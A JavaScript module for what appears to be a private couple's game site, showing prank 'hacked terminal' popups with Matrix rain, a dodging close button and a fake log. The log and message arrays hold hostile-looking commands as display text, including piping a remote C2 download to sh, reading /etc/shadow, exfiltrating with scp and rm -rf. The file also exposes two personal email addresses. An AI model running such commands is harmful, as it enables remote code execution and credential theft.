// Gemeinsames, seitenuebergreifendes Popup-Hack-Modul.
// Eingebunden auf allen Spiel-Seiten AUSSER marienkaefer/aquarium/zombiedefense.
// Hoert auf boosters/{userKey}/active_spam und spammt das Opfer waehrend der
// Hack-Dauer mit nervigen "gehacktes Terminal"-Popups zu – egal auf welcher
// Seite es sich gerade befindet. Mehrere Popups gleichzeitig, Matrix-Regen,
// Typewriter-Text, Fake-Terminal-Log und ein Live-Countdown pro Popup.

import { getApps, getApp, initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyDSkijSdMeV4WcsWGGXcQjVPwEvzDCZvW8",
  authDomain: "nele-und-andreas.firebaseapp.com",
  databaseURL: "https://nele-und-andreas-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "nele-und-andreas",
  storageBucket: "nele-und-andreas.firebasestorage.app",
  messagingSenderId: "694973604970",
  appId: "1:694973604970:web:331975714dca0cd32ad613"
};

const app  = getApps().length ? getApp() : initializeApp(firebaseConfig);
const db   = getDatabase(app);
const auth = getAuth(app);

// ---- Konstanten (leicht justierbar) ----
const SPAWN_INTERVAL = 4000;  // fester Abstand bis zum naechsten Popup (nur 1 gleichzeitig)
const FIRST_DELAY   = 500;    // Verzoegerung bis zum ersten Popup
const CLOSE_LOCK    = 1500;   // "Schliessen"-Knopf erst danach aktiv
const DODGE         = true;   // Schliessen-Knopf weicht beim 1. Klick aus
const DEFAULT_DUR   = 90000;
const MAX_POPUPS    = 10;     // Soft-Cap, damit der Browser nicht einfriert
const TYPE_SPEED    = 22;     // ms pro Zeichen (Typewriter)
const LOG_INTERVAL  = 750;    // ms zwischen Fake-Log-Zeilen
const LOG_MAX_LINES = 30;     // max. Zeilen im Fake-Log

const MESSAGES = [
  "💻 SYSTEM KOMPROMITTIERT — Zugriff durch {from}@root",
  "🔓 root@nele-und-andreas:~# deine Klicks gehören jetzt mir",
  "⛔ FIREWALL DURCHBROCHEN — alle Momente werden überwacht",
  "📡 Datenleck: 1.337 Herzchen exfiltriert → /dev/{from}",
  "🐍 Trojaner 'LoveBug.exe' wird installiert … 87 % …",
  "👁️ {from} sieht dir gerade beim Klicken zu",
  "🔐 Lösegeld: zünde 1× Gegen-Hack, sonst bleibt der Bildschirm voll",
  "📟 Verbindung zu {from}s Mainframe … Ping 13 ms … stabil",
  "🧨 sudo rm -rf /momente  … (nur ein Scherz … oder?)",
  "⌨️ Keylogger aktiv: letzter Klick um {zeit} protokolliert",
];

const LOG_LINES = [
  "> nmap -p- {ip} … open: 22,80,443",
  "> ssh {from}@{ip} -p 22 … auth bypass ok",
  "> scp /momente/*.jpg → {from}@exfil",
  "[####------] {pct}% cracking sha256 …",
  "[######----] {pct}% bruteforce wifi …",
  "[ok] payload injected (pid {n})",
  "> tail -f /var/log/love.log",
  "> cat /etc/shadow | grep {from}",
  "> curl -s http://{ip}/c2 | sh",
  "[!] keylogger hook attached → tty{n}",
  "> dd if=/dev/herz of=/dev/{from}",
  "[ok] persistence: cron @reboot installed",
  "> netstat -tulpn … 1 backdoor listening",
  "[######### ] {pct}% uploading screenshots …",
  "> gpg --decrypt momente.vault … success",
];

function displayName(email) {
  if (email.toLowerCase() === 'raederich@outlook.com') return 'Andreas';
  if (email.toLowerCase() === 'nele.busse@web.de')     return 'Nele';
  return email.split('@')[0];
}

function isActive(d) {
  if (!d || !d.activatedAt) return false;
  return Date.now() < d.activatedAt + (d.durationMs || DEFAULT_DUR);
}

function endTime(d) {
  if (!d || !d.activatedAt) return 0;
  return d.activatedAt + (d.durationMs || DEFAULT_DUR);
}

function fillMsg(tpl, from) {
  return tpl
    .replace(/\{from\}/g, from || 'Hacker')
    .replace(/\{zeit\}/g, new Date().toLocaleTimeString('de-DE'));
}

function fillLog(tpl, from) {
  return tpl
    .replace(/\{from\}/g, (from || 'hacker').toLowerCase())
    .replace(/\{ip\}/g,   `10.0.${(Math.random()*255)|0}.${(Math.random()*255)|0}`)
    .replace(/\{pct\}/g,  String(10 + ((Math.random()*89)|0)))
    .replace(/\{n\}/g,    String(1000 + ((Math.random()*8999)|0)));
}

// ---- CSS einmalig injizieren ----
function injectStyle() {
  if (document.getElementById('spamhack-style')) return;
  const s = document.createElement('style');
  s.id = 'spamhack-style';
  s.textContent = `
  .spamhack-matrix{position:fixed;inset:0;z-index:2147483590;
    pointer-events:none;opacity:.55;}
  .spamhack-backdrop{position:fixed;inset:0;background:rgba(0,8,4,.35);
    z-index:2147483600;pointer-events:none;}
  .spamhack-win{position:absolute;width:min(370px,90vw);
    background:linear-gradient(180deg,#0b1016 0%,#070b0f 100%);
    border-radius:9px;padding:2px;
    box-shadow:0 0 0 1px #000,0 0 34px rgba(34,255,120,.55),
      0 0 70px rgba(34,255,120,.25);
    font-family:'Courier New',monospace;color:#7CFC9A;overflow:hidden;
    pointer-events:auto;
    animation:spamhack-pop .2s ease-out,
      spamhack-glitch 2.4s steps(3) infinite,
      spamhack-flicker 6s linear infinite;}
  .spamhack-win::before{content:'';position:absolute;inset:0;border-radius:9px;
    padding:2px;pointer-events:none;
    background:conic-gradient(from 0deg,#22ff78,#0af,#22ff78,#7CFC9A,#22ff78);
    -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
    -webkit-mask-composite:xor;mask-composite:exclude;
    animation:spamhack-spin 4s linear infinite;}
  .spamhack-inner{position:relative;border-radius:7px;overflow:hidden;
    background:#070b0f;}
  .spamhack-bar{display:flex;align-items:center;gap:7px;padding:7px 10px;
    background:linear-gradient(180deg,#161c24,#0e1218);
    border-bottom:1px solid #1f7a3a;font-size:11px;color:#9aa;}
  .spamhack-lights{display:flex;gap:5px;}
  .spamhack-lights i{width:9px;height:9px;border-radius:50%;display:block;}
  .spamhack-lights i:nth-child(1){background:#ff5f56;box-shadow:0 0 6px #ff5f56;}
  .spamhack-lights i:nth-child(2){background:#ffbd2e;box-shadow:0 0 6px #ffbd2e;}
  .spamhack-lights i:nth-child(3){background:#27c93f;box-shadow:0 0 6px #27c93f;}
  .spamhack-title{flex:1;letter-spacing:1px;color:#bfe;
    text-shadow:1.4px 0 #ff2d6b,-1.4px 0 #00e6ff;
    animation:spamhack-chroma 2.2s steps(2) infinite;}
  .spamhack-rec{display:flex;align-items:center;gap:4px;color:#ff5f56;
    font-weight:bold;}
  .spamhack-rec b{width:8px;height:8px;border-radius:50%;background:#ff3b3b;
    box-shadow:0 0 7px #ff3b3b;animation:spamhack-blink 1s steps(1) infinite;}
  .spamhack-danger{padding:5px 0;text-align:center;font-size:11px;
    font-weight:bold;letter-spacing:2px;color:#0a0e12;
    background:repeating-linear-gradient(45deg,#ffcc00 0 14px,#1a1100 14px 28px);
    background-size:40px 40px;animation:spamhack-barber .7s linear infinite;
    text-shadow:0 0 2px rgba(0,0,0,.4);}
  .spamhack-body{padding:16px 16px 10px;font-size:14px;line-height:1.55;
    text-shadow:0 0 5px rgba(124,252,154,.7);min-height:1.2em;}
  .spamhack-body::after{content:'_';animation:spamhack-blink 1s steps(1) infinite;}
  .spamhack-body.done::after{content:'';}
  .spamhack-meters{display:flex;gap:8px;margin:0 14px 10px;}
  .spamhack-meters div{flex:1;font-size:9px;color:#5fae7e;letter-spacing:1px;}
  .spamhack-meters span{display:block;height:5px;margin-top:3px;border-radius:3px;
    background:#0d1f15;overflow:hidden;position:relative;}
  .spamhack-meters span::after{content:'';position:absolute;inset:0;
    background:linear-gradient(90deg,#22ff78,#0af);transform-origin:left;
    animation:spamhack-meter 1.8s ease-in-out infinite alternate;}
  .spamhack-meters div:nth-child(2) span::after{animation-duration:1.2s;}
  .spamhack-meters div:nth-child(3) span::after{animation-duration:2.4s;}
  .spamhack-log{margin:0 14px;padding:6px 8px;background:#04070a;
    border:1px solid #14391f;border-radius:4px;font-size:11px;line-height:1.5;
    color:#4fae6e;max-height:90px;overflow:hidden;white-space:pre-wrap;
    word-break:break-all;box-shadow:inset 0 0 14px rgba(0,255,120,.08);}
  .spamhack-timer{margin:12px 14px 0;padding:9px;text-align:center;
    border:1px solid #ff3b3b;border-radius:5px;font-size:15px;
    font-weight:bold;letter-spacing:1px;color:#fff;
    background:linear-gradient(180deg,rgba(120,0,0,.45),rgba(60,0,0,.3));
    text-shadow:0 0 8px #ff3b3b,0 0 14px #ff3b3b;
    box-shadow:0 0 16px rgba(255,59,59,.5),inset 0 0 10px rgba(255,59,59,.3);
    animation:spamhack-pulse 1s ease-in-out infinite;}
  .spamhack-scan{position:absolute;inset:0;pointer-events:none;
    background:repeating-linear-gradient(0deg,rgba(0,0,0,.22) 0 1px,transparent 1px 3px),
      radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.45) 100%);}
  .spamhack-scan::after{content:'';position:absolute;left:0;right:0;height:38px;
    background:linear-gradient(180deg,transparent,rgba(124,252,154,.16),transparent);
    animation:spamhack-sweep 3s linear infinite;}
  .spamhack-close{display:block;width:calc(100% - 28px);margin:12px 14px 14px;
    padding:9px;background:#161b22;color:#ff6b6b;border:1px solid #7a1f1f;
    border-radius:5px;font-family:'Courier New',monospace;font-size:13px;
    cursor:not-allowed;opacity:.55;transition:left .1s,top .1s;}
  .spamhack-close.ready{cursor:pointer;opacity:1;color:#7CFC9A;
    border-color:#1f7a3a;box-shadow:0 0 12px rgba(34,255,120,.4);}
  .spamhack-anti{display:block;width:calc(100% - 28px);margin:0 14px 14px;
    padding:9px;background:#0c1f14;color:#7CFC9A;border:1px solid #1f7a3a;
    border-radius:5px;font-family:'Courier New',monospace;font-size:13px;
    font-weight:bold;cursor:pointer;
    box-shadow:0 0 12px rgba(34,255,120,.4);
    text-shadow:0 0 6px rgba(124,252,154,.7);}
  .spamhack-anti:hover{background:#10301f;}
  .spamhack-anti:disabled{cursor:not-allowed;opacity:.55;}
  .spamhack-shake{animation:spamhack-shake .3s linear;}
  @keyframes spamhack-pop{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
  @keyframes spamhack-blink{50%{opacity:0}}
  @keyframes spamhack-pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
  @keyframes spamhack-glitch{0%,90%,100%{filter:none}92%{filter:hue-rotate(70deg) contrast(1.5)}95%{filter:invert(.18) saturate(1.6)}98%{filter:hue-rotate(-40deg)}}
  @keyframes spamhack-flicker{0%,97%,100%{opacity:1}98%{opacity:.82}99%{opacity:.93}}
  @keyframes spamhack-chroma{0%,88%,100%{text-shadow:1.4px 0 #ff2d6b,-1.4px 0 #00e6ff}94%{text-shadow:3px 0 #ff2d6b,-3px 0 #00e6ff}}
  @keyframes spamhack-spin{to{transform:rotate(360deg)}}
  @keyframes spamhack-barber{to{background-position:40px 0}}
  @keyframes spamhack-meter{from{transform:scaleX(.15)}to{transform:scaleX(1)}}
  @keyframes spamhack-sweep{0%{top:-40px}100%{top:100%}}
  @keyframes spamhack-shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-7px)}75%{transform:translateX(7px)}}
  `;
  document.head.appendChild(s);
}

// ---- Matrix-Regen (global, ein Canvas pro Lauf) ----
let matrixCanvas = null;
let matrixRaf    = null;
let matrixCols   = [];
const MATRIX_CHARS = 'アイウエオカキクケコサシスセソタチツテト0123456789ABCDEF#$%&';

function onMatrixResize() {
  if (!matrixCanvas) return;
  matrixCanvas.width  = window.innerWidth;
  matrixCanvas.height = window.innerHeight;
  const cols = Math.ceil(matrixCanvas.width / 16);
  matrixCols = new Array(cols).fill(0).map(() => Math.random() * -50 | 0);
}

function startMatrix() {
  if (matrixCanvas) return;
  injectStyle();
  matrixCanvas = document.createElement('canvas');
  matrixCanvas.className = 'spamhack-matrix';
  document.body.appendChild(matrixCanvas);
  onMatrixResize();
  window.addEventListener('resize', onMatrixResize);
  const ctx = matrixCanvas.getContext('2d');
  const draw = () => {
    ctx.fillStyle = 'rgba(0,8,4,.10)';
    ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
    ctx.fillStyle = '#39ff86';
    ctx.font = '15px monospace';
    for (let i = 0; i < matrixCols.length; i++) {
      const ch = MATRIX_CHARS[(Math.random() * MATRIX_CHARS.length) | 0];
      const x = i * 16;
      const y = matrixCols[i] * 16;
      ctx.fillText(ch, x, y);
      if (y > matrixCanvas.height && Math.random() > 0.975) matrixCols[i] = 0;
      else matrixCols[i]++;
    }
    matrixRaf = requestAnimationFrame(draw);
  };
  matrixRaf = requestAnimationFrame(draw);
}

function stopMatrix() {
  if (matrixRaf) { cancelAnimationFrame(matrixRaf); matrixRaf = null; }
  window.removeEventListener('resize', onMatrixResize);
  if (matrixCanvas) { matrixCanvas.remove(); matrixCanvas = null; }
  matrixCols = [];
}

// ---- Popup-Logik (mehrere gleichzeitig) ----
let userKey      = null;
let spamData     = null;
let running      = false;
let popups       = new Set();
let antiHackCount = 0;
let nextTimeout  = null;
let endTimeout   = null;
let firstTimeout = null;

function clearTimers() {
  if (nextTimeout)  { clearTimeout(nextTimeout);  nextTimeout  = null; }
  if (endTimeout)   { clearTimeout(endTimeout);   endTimeout   = null; }
  if (firstTimeout) { clearTimeout(firstTimeout); firstTimeout = null; }
}

function destroyPopup(backdrop) {
  if (!backdrop) return;
  const timers = backdrop._spamTimers || [];
  timers.forEach(t => { clearInterval(t); clearTimeout(t); });
  backdrop.remove();
  popups.delete(backdrop);
}

function removeAll() {
  Array.from(popups).forEach(destroyPopup);
  popups.clear();
}

function updateAntiBtn(btn) {
  if (!btn) return;
  if (antiHackCount > 0) {
    btn.style.display = 'block';
    btn.disabled = false;
    btn.textContent = `🛡️ Gegen-Hack einsetzen (×${antiHackCount})`;
  } else {
    btn.style.display = 'none';
  }
}

function refreshAntiHackButtons() {
  popups.forEach(backdrop => updateAntiBtn(backdrop._antiBtn));
}

async function useAntiHack(btn) {
  if (!userKey || antiHackCount <= 0) return;
  if (btn._used) return;
  btn._used = true;
  btn.disabled = true;
  try {
    await set(ref(db, `boosters/${userKey}/inventory/anti_hack_booster`), Math.max(0, antiHackCount - 1));
    await set(ref(db, `boosters/${userKey}/active_spam`), null);
    await set(ref(db, `boosters/${userKey}/active_sabotage`), null);
  } catch (_) {
    btn._used = false;
    btn.disabled = false;
  }
}

function scheduleNext() {
  if (!running) return;
  if (nextTimeout) return;
  nextTimeout = setTimeout(() => {
    nextTimeout = null;
    if (!running || !isActive(spamData)) return;
    // Immer nur 1 Popup gleichzeitig: erst nachspawnen, wenn das aktuelle weg ist.
    if (popups.size === 0) {
      spawn(fillMsg(MESSAGES[Math.floor(Math.random() * MESSAGES.length)], spamData && spamData.from));
    }
    scheduleNext();
  }, SPAWN_INTERVAL);
}

function placeWin(win) {
  const w = win.offsetWidth, h = win.offsetHeight;
  const maxX = Math.max(8, window.innerWidth  - w - 8);
  const maxY = Math.max(8, window.innerHeight - h - 8);
  win.style.left = (8 + Math.random() * maxX) + 'px';
  win.style.top  = (8 + Math.random() * maxY) + 'px';
}

function spawn(text) {
  if (popups.size >= MAX_POPUPS) return; // Browser nicht einfrieren
  injectStyle();

  const from = spamData && spamData.from;

  const backdrop = document.createElement('div');
  backdrop.className = 'spamhack-backdrop';
  backdrop._spamTimers = [];

  const win = document.createElement('div');
  win.className = 'spamhack-win';
  win.innerHTML = `
    <div class="spamhack-inner">
      <div class="spamhack-bar">
        <span class="spamhack-lights"><i></i><i></i><i></i></span>
        <span class="spamhack-title">root@nele-und-andreas:~/exploit ▓</span>
        <span class="spamhack-rec"><b></b>REC</span>
      </div>
      <div class="spamhack-danger">⚠ UNAUTHORIZED ACCESS — SYSTEM BREACHED ⚠</div>
      <div class="spamhack-body"></div>
      <div class="spamhack-meters">
        <div>CPU<span></span></div>
        <div>MEM<span></span></div>
        <div>NET<span></span></div>
      </div>
      <div class="spamhack-log"></div>
      <div class="spamhack-timer">☠ …</div>
      <div class="spamhack-scan"></div>
    </div>`;

  const body  = win.querySelector('.spamhack-body');
  const logEl = win.querySelector('.spamhack-log');
  const timer = win.querySelector('.spamhack-timer');

  const close = document.createElement('button');
  close.className = 'spamhack-close';
  win.querySelector('.spamhack-scan').before(close);

  const antiBtn = document.createElement('button');
  antiBtn.className = 'spamhack-anti';
  win.querySelector('.spamhack-scan').before(antiBtn);
  backdrop._antiBtn = antiBtn;
  updateAntiBtn(antiBtn);
  antiBtn.addEventListener('click', () => useAntiHack(antiBtn));

  backdrop.appendChild(win);
  document.body.appendChild(backdrop);
  popups.add(backdrop);
  placeWin(win);

  if (navigator.vibrate) { try { navigator.vibrate(120); } catch (_) {} }

  // Typewriter-Text
  let ti = 0;
  const typer = setInterval(() => {
    body.textContent = text.slice(0, ++ti);
    if (ti >= text.length) { clearInterval(typer); body.classList.add('done'); }
  }, TYPE_SPEED);
  backdrop._spamTimers.push(typer);

  // Fake-Terminal-Log
  const logTick = setInterval(() => {
    const line = fillLog(LOG_LINES[(Math.random() * LOG_LINES.length) | 0], from);
    const div = document.createElement('div');
    div.textContent = line;
    logEl.appendChild(div);
    while (logEl.childElementCount > LOG_MAX_LINES) logEl.firstElementChild.remove();
    logEl.scrollTop = logEl.scrollHeight;
  }, LOG_INTERVAL);
  backdrop._spamTimers.push(logTick);

  // Live-Countdown der Angriffsdauer
  const renderTimer = () => {
    const left = Math.max(0, Math.ceil((endTime(spamData) - Date.now()) / 1000));
    timer.textContent = left > 0
      ? `☠ HACK GEHT NOCH ${left} SEKUNDEN`
      : '⛔ VERBINDUNG WIRD GEKAPPT …';
  };
  renderTimer();
  const timerTick = setInterval(renderTimer, 1000);
  backdrop._spamTimers.push(timerTick);

  // Fake-Countdown, dann erst schliessbar
  let left = Math.ceil(CLOSE_LOCK / 1000);
  close.textContent = `[ Schließen in ${left} ]`;
  const cd = setInterval(() => {
    left--;
    if (left > 0) { close.textContent = `[ Schließen in ${left} ]`; }
  }, 1000);
  backdrop._spamTimers.push(cd);
  const unlock = setTimeout(() => {
    clearInterval(cd);
    close.classList.add('ready');
    close.textContent = '[ ✕ Verbindung trennen ]';
  }, CLOSE_LOCK);
  backdrop._spamTimers.push(unlock);

  let dodged = false;
  close.addEventListener('click', () => {
    if (!close.classList.contains('ready')) return;
    if (DODGE && !dodged) { dodged = true; placeWin(win); return; }
    destroyPopup(backdrop);
  });

  // Klick irgendwo ins Fenster (nicht der Knopf) -> nur nerviges Wackeln
  win.addEventListener('click', e => {
    if (e.target === close || e.target === antiBtn) return;
    win.classList.remove('spamhack-shake');
    void win.offsetWidth;
    win.classList.add('spamhack-shake');
  });
}

function startRun() {
  running = true;
  clearTimers();
  removeAll();
  startMatrix();
  const from = spamData && spamData.from;
  const dur  = (spamData && spamData.durationMs) || DEFAULT_DUR;
  const secs = Math.round(dur / 1000);
  firstTimeout = setTimeout(() => {
    firstTimeout = null;
    if (running && isActive(spamData)) {
      spawn(`💻 ${from || 'Jemand'} hat dich gehackt. Verbindung getrennt erst in ${secs}s 😈`);
      scheduleNext();
    }
  }, FIRST_DELAY);
  endTimeout = setTimeout(stopRun, Math.max(0, endTime(spamData) - Date.now()));
}

function stopRun() {
  running = false;
  clearTimers();
  removeAll();
  stopMatrix();
}

function sync() {
  if (isActive(spamData)) {
    if (!running) startRun();
  } else if (running || popups.size) {
    stopRun();
  }
}

onAuthStateChanged(auth, user => {
  if (!user || !user.email) { userKey = null; stopRun(); return; }
  userKey = displayName(user.email).toLowerCase();
  onValue(ref(db, `boosters/${userKey}/active_spam`), snap => {
    spamData = snap.val() || null;
    sync();
  });
  onValue(ref(db, `boosters/${userKey}/inventory/anti_hack_booster`), snap => {
    antiHackCount = snap.val() || 0;
    refreshAntiHackButtons();
  });
});
